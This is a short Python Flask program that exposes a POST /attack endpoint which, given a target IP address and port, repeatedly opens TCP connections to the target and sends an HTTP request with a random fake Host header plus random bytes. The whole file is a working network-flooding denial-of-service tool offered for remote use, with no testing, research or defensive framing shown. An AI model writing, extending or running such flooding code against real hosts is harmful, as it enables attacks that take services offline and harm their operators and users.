from flask import Flask, jsonify, request
import socket
import random
import os

app = Flask(__name__)

@app.route('/attack', methods=['POST'])
def start_attack():
    data = request.get_json()
    num_bytes = data.get('payload', 1024)
    num_attacks = data.get('attack_num', 100000)
    target_ip = data.get('ip', "0.0.0.0")
    target_port = data.get('port', 80)

    def attack():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, int(target_port)))
        fake_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
        host_header = f"Host: {fake_ip}\r\n"
        payload = f"GET / HTTP/1.1\r\n{host_header}\r\n"
        s.send(payload.encode())
        s.send(os.urandom(int(num_bytes)))
        

    for _ in range(int(data.get('threads', 10))):
        for _ in range(int(num_attacks)):
            attack()

    return jsonify({'success': True, 'message': 'Attack finished successfully.'})

if __name__ == '__main__':
    app.run(debug=True)
